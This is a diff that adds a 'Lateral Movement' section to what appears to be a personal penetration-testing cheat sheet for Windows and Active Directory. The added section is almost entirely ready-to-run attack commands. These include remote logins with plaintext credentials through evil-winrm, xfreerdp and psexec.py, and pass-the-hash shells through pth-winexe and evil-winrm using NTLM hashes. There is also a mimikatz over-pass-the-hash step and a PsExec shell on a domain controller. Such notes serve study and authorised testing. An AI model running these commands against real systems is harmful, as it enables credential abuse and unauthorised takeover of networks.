@@ -180,3 +180,33 @@ Open the PowerShell, execute on PowerShell.
 - Download the password file with weak passwords.
 - Test each password against all active user accounts, except privileged user accounts (admincount=1).
 - Output script progress/status information to console.
+
+# Lateral Movement~
+## Pass The Hash
+c.f.) https://book.hacktricks.xyz/pentesting/pentesting-smb
+
+```
+evil-winrm -i 10.11.1.121 -u sqlServer -p shantewhite
+
+xfreerdp /u:sqlServer /p:shantewhite /v:10.11.1.121
+
+psexec.py alice:ThisIsTheUsersPassword01@10.11.1.50 cmd.exe
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+
+(evil-winrm -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e  -i 192.168.177.10)
+
+```
+
+## Over Pass The Hash
+Converting NTLM hash to TGT and get another user's shell.
+
+```mimikatz# sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe ```
+
+<- (I can execute commands on this PowerSHell as Jeff_Admin user)
+
+```
+PS C:¥Windows¥system32> net use \\dc01  (<- generate TGT)
+PS C:¥Tools¥active_directory> .¥PsExec.exe \\dc01 cmd.exe
+
+```
